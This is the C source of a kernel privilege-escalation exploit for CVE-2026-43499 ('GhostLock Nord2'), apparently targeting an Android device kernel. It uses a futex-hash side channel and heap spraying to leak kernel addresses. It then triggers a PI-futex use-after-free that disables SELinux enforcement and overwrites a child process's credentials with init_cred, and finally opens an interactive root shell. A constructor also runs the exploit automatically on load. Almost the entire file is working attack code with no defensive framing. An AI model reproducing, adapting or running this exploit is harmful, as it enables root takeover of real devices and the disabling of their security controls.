/*
 * GhostLock Nord2 – CVE-2026-43499 full exploit
 *
 * Stages:
 *  0. KASLR: read _stext from kallsyms (root) or perf mmap (non-root TODO)
 *  1. KernelSnitch: spray mm_struct slabs → leak page_base
 *  2. SKB spray: fill page_base with fake fops/waiter/task payload
 *  3. PI-futex UAF route × 2:
 *       Write 1 → selinux_enforcing = 0
 *       Write 2 → child task->cred  = init_cred
 *  4. child setuid(0) → execve shell
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <time.h>

/* Local headers */
#include "src/nord2_offsets.h"
#include "src/payload.h"
#include "src/route.h"
#include "src/perf_task.h"

/* Use the upstream KernelSnitch headers directly */
#define __ARM 1
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#include "src/kernelsnitch/kernelsnitch.h"

#ifndef SYS_futex
#define SYS_futex 98
#endif

/* ── helpers ─────────────────────────────────────────────────── */
static void die(const char *m) {
    fprintf(stderr,"[!] %s (errno=%d)\n", m, errno); exit(1);
}
#undef SYSCHK
#define SYSCHK(x) ({ __typeof__(x) _r=(x); if((long)(_r)<0){die(#x);} _r; })

static uint64_t kallsyms_sym(const char *name) {
    FILE *f = fopen("/proc/kallsyms","r");
    if (!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while (fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if (!strcmp(s,name)){fclose(f);return a;}
    fclose(f); return 0;
}

static int task_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

static int check_selinux_off(void) {
    int fd=open("/sys/fs/selinux/enforce",O_RDONLY);
    if (fd<0) return 1;
    char b[4]={0}; read(fd,b,1); close(fd);
    return b[0]=='0';
}

/* ── slab drain (creates fresh order-3 slab holes) ───────────── */
static void slab_drain(void) {
    int waves=5, batch=400;
    for (int w=0;w<waves;w++){
        pid_t *ch=calloc(batch,sizeof(pid_t)); int n=0;
        for (int i=0;i<batch;i++){
            ch[i]=fork();
            if(ch[i]==0){pause();_exit(0);}
            if(ch[i]>0) n++;
        }
        for(int i=0;i<n;i++){kill(ch[i],SIGKILL);waitpid(ch[i],NULL,0);}
        free(ch); sched_yield();
    }
}

/* ── prepare kernel page via KernelSnitch + SKB spray ─────────── */
static uint64_t prepare_kernel_page(uint64_t stext, uint64_t init_cred,
                                     uint64_t init_task, uint64_t root_tg,
                                     int mode, uint64_t target, int child_node) {
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    size_t mm_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

    /* ── phase 1: allocate slab context children ── */
    size_t prep_cnt  = mm_per_slab * 4;
    size_t spray_cnt = mm_per_slab * 2;
    size_t pre_cnt   = mm_per_slab - 1;
    size_t post_cnt  = mm_per_slab;

    pid_t *prep_ch  = calloc(prep_cnt, sizeof(pid_t));
    int   *prep_fd  = calloc(prep_cnt, sizeof(int));
    pid_t *spray_ch = calloc(spray_cnt,sizeof(pid_t));
    int   *spray_fd = calloc(spray_cnt,sizeof(int));
    pid_t *pre_ch   = calloc(pre_cnt,  sizeof(pid_t));
    int   *pre_fd   = calloc(pre_cnt,  sizeof(int));
    pid_t *post_ch  = calloc(post_cnt, sizeof(pid_t));
    int   *post_fd  = calloc(post_cnt, sizeof(int));

    if (!prep_ch||!spray_ch||!pre_ch||!post_ch) return 0;

    for (size_t i=0;i<prep_cnt;i++){
        prep_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(prep_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",prep_ch[i]);
        prep_fd[i]=open(path,O_RDONLY);
    }
    for (size_t i=0;i<spray_cnt;i++){
        spray_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(spray_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",spray_ch[i]);
        spray_fd[i]=open(path,O_RDONLY);
    }
    for (size_t i=0;i<pre_cnt;i++){
        pre_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(pre_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",pre_ch[i]);
        pre_fd[i]=open(path,O_RDONLY);
    }

    /* ── KernelSnitch ── */
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0/*verbose*/, 0);
    /* MT6893 has 8 physical cores; fix futex_hashsize to match 4.14 kernel */
    /* kernel futex hash = num_possible_cpus() * 256 = 8 * 256 = 2048        */
    futex_hashsize = 8 * 256;
    ks->futex_hash_table_size = futex_hashsize;
    ks->total_futexes = ks->futex_hash_table_size * KSNITCH_COLLISIONS * 4;
    fprintf(stderr,"[*] KS: futex_hashsize=%lu total_futexes=%zu\n",
            futex_hashsize, ks->total_futexes);
    /* Debug: print what physmap VA the mm_struct should be near */
    /* PAGE_OFFSET=0xffffff8000000000, PHYS_OFFSET=0x40000000 */
    /* physmap_VA = PAGE_OFFSET + phys - PHYS_OFFSET */
    uint64_t page_offset = 0xffffff8000000000ULL;
    uint64_t phys_offset = 0x40000000ULL;
    /* Kernel data at phys 0x41d60000 */
    uint64_t expected_physmap = page_offset + 0x41d60000ULL - phys_offset;
    fprintf(stderr,"[*] KS debug: kernel data physmap VA ~%llx\n",
            (unsigned long long)expected_physmap);
    /* Verify our futex_hash on the expected VA matches collision addresses */
    {
        uint64_t addr0 = ks->futex_addrs[0];
        uint64_t addr1 = ks->futex_addrs[1];
        uint32_t h0a = futex_hash(addr0, expected_physmap);
        uint32_t h0b = futex_hash(addr1, expected_physmap);
        fprintf(stderr,"[*] KS debug: hash(addr0,expected)=%u hash(addr1,expected)=%u match=%d\n",
                h0a, h0b, h0a==h0b);
        /* Also try with stext-based address */
        uint64_t mm_via_stext = stext + INIT_TASK_OFF - 0x500; /* rough estimate */
        uint32_t h1a = futex_hash(addr0, mm_via_stext);
        uint32_t h1b = futex_hash(addr1, mm_via_stext);
        fprintf(stderr,"[*] KS debug: hash(addr0,stext_est)=%u hash(addr1,stext_est)=%u match=%d\n",
                h1a, h1b, h1a==h1b);
    }

    pid_t leak_ch=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
    if(leak_ch==0){
        kernelsnitch_find_collisions(ks);
        exit(0);
    }
    for (size_t i=0;i<post_cnt;i++){
        post_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(post_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",post_ch[i]);
        post_fd[i]=open(path,O_RDONLY);
    }

    /* open memfd for leak child */
    char lpath[64]; snprintf(lpath,sizeof(lpath),"/proc/%d/mem",leak_ch);
    int memfd_leak=open(lpath,O_RDONLY);

    /* free holes */
    for (size_t i=0;i<pre_cnt;i++){close(pre_fd[i]);kill(pre_ch[i],SIGKILL);waitpid(pre_ch[i],NULL,0);}
    for (size_t i=0;i<post_cnt;i++){close(post_fd[i]);kill(post_ch[i],SIGKILL);waitpid(post_ch[i],NULL,0);}
    for (size_t i=0;i<spray_cnt;i+=mm_per_slab){close(spray_fd[i]);kill(spray_ch[i],SIGKILL);waitpid(spray_ch[i],NULL,0);}

    /* ── SKB spray: fill freed slab with payload ── */
    uint8_t *skb_buf = malloc(SKB_SEND_SIZE);
    int sv[2]; SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sv));
    int sndbuf=1<<20;
    setsockopt(sv[0],SOL_SOCKET,SO_SNDBUF,&sndbuf,sizeof(sndbuf));
    int fl=fcntl(sv[0],F_GETFL,0); if(fl>=0) fcntl(sv[0],F_SETFL,fl|O_NONBLOCK);
    int sv2[2]; SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sv2));

    /* We don't know page_base yet, build with placeholder */
    uint64_t placeholder_base = 0xdead000000000000ULL;
    build_skb_payload(skb_buf, placeholder_base, stext, init_cred,
                      init_task, root_tg, mode, target, child_node);

    struct iovec iov={.iov_base=skb_buf,.iov_len=SKB_SEND_SIZE};
    struct msghdr msg; memset(&msg,0,sizeof(msg));
    msg.msg_iov=&iov; msg.msg_iovlen=1;
    SYSCHK(sendmsg(sv2[0],&msg,0));

    /* close pre/post/spray fds to let slab be reclaimed */
    pin_to_core(0); sched_yield(); sched_yield();
    for (size_t i=0;i<pre_cnt;i++) if(pre_fd[i]>0){close(pre_fd[i]);pre_fd[i]=-1;}
    for (size_t i=0;i<post_cnt;i++) if(post_fd[i]>0){close(post_fd[i]);post_fd[i]=-1;}
    for (size_t i=0;i<spray_cnt;i+=mm_per_slab)
        if(spray_fd[i]>0){close(spray_fd[i]);spray_fd[i]=-1;}

    close(sv2[0]); close(sv2[1]);
    sched_yield(); sched_yield();
    /* NOTE: keep memfd_leak OPEN so mm_struct stays in slab for bruteforce */

    /* Send reclaim sprays */
    for (int i=0;i<4;i++){
        errno=0;
        ssize_t sent=sendmsg(sv[0],&msg,MSG_DONTWAIT);
        if(sent<=0) break;
    }

    /* ── brute-force physmap to find leaked mm_struct ── */
    waitpid(leak_ch,NULL,0);
    fprintf(stderr,"[*] KernelSnitch state: %d (want %d=COLLISIONS_FOUND)\n",
            (int)ks->state, (int)KERNELSNITCH_COLLISIONS_FOUND);
    if (!kernelsnitch_found_collisions(ks)){
        fprintf(stderr,"[!] KernelSnitch: no collisions\n");
        close(memfd_leak);
        kernelsnitch_cleanup(ks); goto cleanup;
    }
    /* Print collision addresses before cleanup */
    uint64_t dbg_addrs[4]={0};
    for(int i=0;i<4&&i<(int)ks->collisions+1;i++) dbg_addrs[i]=(uint64_t)ks->futex_addrs[i];

    kernelsnitch_bruteforce(ks);
    /* Now free the mm_struct so the slab slot can be reclaimed */
    close(memfd_leak);
    uint64_t leaked=(uint64_t)kernelsnitch_cleanup(ks); ks=NULL;
    if (leaked==(uint64_t)-1){
        fprintf(stderr,"[!] KernelSnitch bruteforce failed, trying manual scan\n");
        /* Fallback: manually scan physmap for mm matching collision addresses */
        leaked = 0;
        uint64_t a0=(uint64_t)dbg_addrs[0], a1=(uint64_t)dbg_addrs[1];
        uint64_t po=0xffffff8000000000ULL, phys_off=0x40000000ULL;
        /* Scan from kernel slab area (phys 0x41000000..0x43000000) */
        for(uint64_t phys=0x41000000ULL; phys<0x44000000ULL && !leaked; phys+=0x8000){
            uint64_t slab_va=po+phys-phys_off;
            for(uint64_t mm_off=0;mm_off<0x8000&&!leaked;mm_off+=0x500){
                uint64_t mm_cand=slab_va+mm_off;
                if(futex_hash(a0,mm_cand)==futex_hash(a1,mm_cand)){
                    leaked=mm_cand;
                }
            }
        }
        if (!leaked){
            fprintf(stderr,"[!] Manual scan also failed\n"); goto cleanup;
        }
        fprintf(stderr,"[+] Manual scan found mm_struct: %llx\n",(unsigned long long)leaked);
    }
    fprintf(stderr,"[*] mm_struct leak: %llx\n",(unsigned long long)leaked);

    /* page_base = align leaked address to ORDER3 boundary */
    uint64_t page_base = leaked & ~((uint64_t)ORDER3_SIZE - 1);
    fprintf(stderr,"[*] page_base: %llx\n",(unsigned long long)page_base);

    /* Rebuild skb with real page_base */
    build_skb_payload(skb_buf, page_base, stext, init_cred,
                      init_task, root_tg, mode, target, child_node);

    /* Send real payload */
    for (int i=0;i<4;i++){
        sendmsg(sv[0],&msg,MSG_DONTWAIT);
    }

    close(sv[0]); close(sv[1]);
    free(skb_buf);

    for (size_t i=0;i<prep_cnt;i++){
        close(prep_fd[i]);
        kill(prep_ch[i],SIGKILL); waitpid(prep_ch[i],NULL,0);
    }
    for (size_t i=0;i<spray_cnt;i++){
        if(spray_fd[i]>0) close(spray_fd[i]);
        kill(spray_ch[i],SIGKILL); waitpid(spray_ch[i],NULL,0);
    }
    free(prep_ch);free(prep_fd);free(spray_ch);free(spray_fd);
    free(pre_ch);free(pre_fd);free(post_ch);free(post_fd);
    return page_base;

cleanup:
    free(skb_buf);
    close(sv[0]); close(sv[1]);
    for(size_t i=0;i<prep_cnt;i++){close(prep_fd[i]);kill(prep_ch[i],SIGKILL);waitpid(prep_ch[i],NULL,0);}
    free(prep_ch);free(prep_fd);free(spray_ch);free(spray_fd);
    free(pre_ch);free(pre_fd);free(post_ch);free(post_fd);
    return 0;
}

/* ── do_one_write ─────────────────────────────────────────────── */
static int do_one_write(uint64_t stext, uint64_t init_cred, uint64_t init_task,
                         uint64_t root_tg, int mode, uint64_t target,
                         int child_node, int shift) {
    fprintf(stderr,"[*] Write %d target=%llx child_node=%d shift=%d\n",
            mode,(unsigned long long)target,child_node,shift);

    uint64_t page_base = prepare_kernel_page(stext, init_cred, init_task,
                                              root_tg, mode, target, child_node);
    if (!page_base){fprintf(stderr,"[!] prepare_kernel_page failed\n"); return 0;}

    struct route_state rs;
    memset(&rs,0,sizeof(rs));
    rs.pselect_shift = shift;
    rs.page_base     = page_base;
    rs.fake_task     = page_base + (uint64_t)SKB_DATA_DELTA + W0_OFF;
    rs.fake_lock     = page_base + (uint64_t)SKB_DATA_DELTA + LOCK_OFF;

    for (int att=1; att<=8; att++){
        fprintf(stderr,"[*]   route attempt %d/8\n",att);
        if (att>1){
            page_base = prepare_kernel_page(stext, init_cred, init_task,
                                             root_tg, mode, target, child_node);
            if (!page_base) continue;
            rs.page_base = page_base;
            rs.fake_task = page_base + (uint64_t)SKB_DATA_DELTA + W0_OFF;
            rs.fake_lock = page_base + (uint64_t)SKB_DATA_DELTA + LOCK_OFF;
        }
        run_route(&rs);
        usleep(100000);
        /* Check success */
        if (mode==1 && check_selinux_off()){
            fprintf(stderr,"[+] Write 1 success: SELinux OFF\n"); return 1;
        }
        if (mode==2){
            return 1;  /* verified by caller checking uid */
        }
    }
    return 0;
}

/* ── child process (runs as the privilege target) ─────────────── */
struct child_shared {
    atomic_int go, done;
    uint32_t uid_after;
};

static void child_main(int cmd_r, struct child_shared *sh) {
    close(0);
    /* Wait for go signal */
    for (int i=0;i<5000;i++){
        if (atomic_load(&sh->go)) break;
        usleep(1000);
    }
    if (!atomic_load(&sh->go)) _exit(2);
    sh->uid_after = (uint32_t)getuid();
    if (sh->uid_after==0){
        /* Execute the root shell script */
        int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
        if(efd>=0){write(efd,"0",1);close(efd);}
        execl("/system/bin/sh","sh","-i",NULL);
    }
    atomic_store(&sh->done,1);
    _exit(sh->uid_after==0?0:1);
}

/* ── main exploit ─────────────────────────────────────────────── */
int run_exploit(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    setvbuf(stdout,NULL,_IONBF,0);

    fprintf(stderr,"\n=== GhostLock Nord2 CVE-2026-43499 ===\n");
    fprintf(stderr,"[*] UID=%d\n\n",getuid());

    /* 0. KASLR */
    uint64_t stext = kallsyms_sym("_stext");
    if (!stext){
        /* Non-root fallback: perf_event mmap scan (TODO: implement) */
        fprintf(stderr,"[!] Cannot read kallsyms — need root for KASLR\n");
        return 1;
    }
    uint64_t init_task     = stext + INIT_TASK_OFF;
    uint64_t init_cred     = stext + INIT_CRED_OFF;
    uint64_t selinux_enf   = stext + SELINUX_ENFORCING_OFF;
    uint64_t root_tg       = stext + ROOT_TASK_GROUP_OFF;
    fprintf(stderr,"[*] stext=%llx  init_task=%llx  init_cred=%llx\n",
            (unsigned long long)stext,
            (unsigned long long)init_task,
            (unsigned long long)init_cred);

    /* Pin to core 0 */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs);
    sched_setaffinity(0,sizeof(cs),&cs);

    /* Increase limits */
    struct rlimit rl={4096,4096};
    setrlimit(RLIMIT_NOFILE,&rl);

    /* ── Spawn child process (will become root) ── */
    struct child_shared *sh = mmap(NULL,sizeof(*sh),
        PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    memset(sh,0,sizeof(*sh));
    /* task_pipe: child writes task addr, parent reads it */
    int task_pipe[2]; pipe(task_pipe);

    pid_t child=fork();
    if (child<0) die("fork");
    if (child==0){
        close(task_pipe[0]);   /* close read end */
        prctl(PR_SET_NAME,"gl_child");
        /* Use perf to leak our own task_struct */
        uint64_t my_task = perf_find_task();
        write(task_pipe[1],&my_task,sizeof(my_task));
        close(task_pipe[1]);
        if (!my_task) _exit(1);
        /* Wait for parent to signal us */
        for (int i=0;i<10000;i++){
            if (atomic_load(&sh->go)) break;
            usleep(1000);
        }
        if (!atomic_load(&sh->go)){_exit(2);}
        sh->uid_after=(uint32_t)getuid();
        atomic_store(&sh->done,1);
        if (sh->uid_after==0){
            int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
            if(efd>=0){write(efd,"0",1);close(efd);}
            execl("/system/bin/sh","sh","-i",NULL);
        }
        _exit(sh->uid_after==0?0:1);
    }
    close(task_pipe[1]);   /* close write end in parent */

    /* Read child task_struct addr */
    uint64_t child_task=0;
    read(task_pipe[0],&child_task,sizeof(child_task));
    close(task_pipe[0]);

    fprintf(stderr,"[*] child pid=%d  task=%llx\n",
            (int)child,(unsigned long long)child_task);

    if (!child_task){
        fprintf(stderr,"[!] perf task leak failed\n");
        kill(child,SIGKILL); waitpid(child,NULL,0);
        return 1;
    }

    uint64_t child_cred = child_task + TASK_CRED_OFF;

    /* ── Write 1: SELinux → permissive ── */
    int selinux_ok = check_selinux_off();
    if (!selinux_ok){
        slab_drain();
        for (int att=1; att<=5&&!selinux_ok; att++){
            fprintf(stderr,"[*] W1 attempt %d/5\n",att);
            slab_drain();
            if (do_one_write(stext, init_cred, init_task, root_tg,
                              1, selinux_enf, 1, PSELECT_WAITER_WORD_SHIFT)){
                usleep(100000);
                if (check_selinux_off()){selinux_ok=1; break;}
            }
        }
        if (!selinux_ok){fprintf(stderr,"[!] Write 1 failed\n"); goto fail;}
        fprintf(stderr,"[+] SELinux DISABLED\n");
    } else {
        fprintf(stderr,"[+] SELinux already off\n");
    }

    /* ── Write 2: child task->cred = init_cred ── */
    {
        int got_root=0;
        for (int rnd=1; rnd<=10&&!got_root; rnd++){
            fprintf(stderr,"[*] W2 round %d/10  target=%llx\n",
                    rnd,(unsigned long long)child_cred);
            slab_drain();
            do_one_write(stext, init_cred, init_task, root_tg,
                          2, child_cred, 1, PSELECT_WAITER_WORD_SHIFT);
            usleep(50000);
            /* Signal child to check uid */
            atomic_store(&sh->go,1);
            for (int i=0;i<2000;i++){
                if (atomic_load(&sh->done)) break;
                usleep(1000);
            }
            if (sh->uid_after==0){
                fprintf(stderr,"[+] child uid=0 — ROOT!\n");
                got_root=1;
            } else {
                fprintf(stderr,"[-] child uid=%u (round %d)\n",sh->uid_after,rnd);
                atomic_store(&sh->go,0);
                atomic_store(&sh->done,0);
                sh->uid_after=0;
            }
        }
        if (!got_root){fprintf(stderr,"[!] Write 2 failed\n"); goto fail;}
    }

    /* Root child will execl a shell */
    waitpid(child,NULL,0);
    fprintf(stderr,"[+] EXPLOIT COMPLETE\n");
    return 0;

fail:
    kill(child,SIGKILL); waitpid(child,NULL,0);
    return 1;
}

int main(void) { return run_exploit(); }
__attribute__((constructor)) static void _init(void) {
    static int ran=0; if(ran++) return; ran=1;
    run_exploit();
}
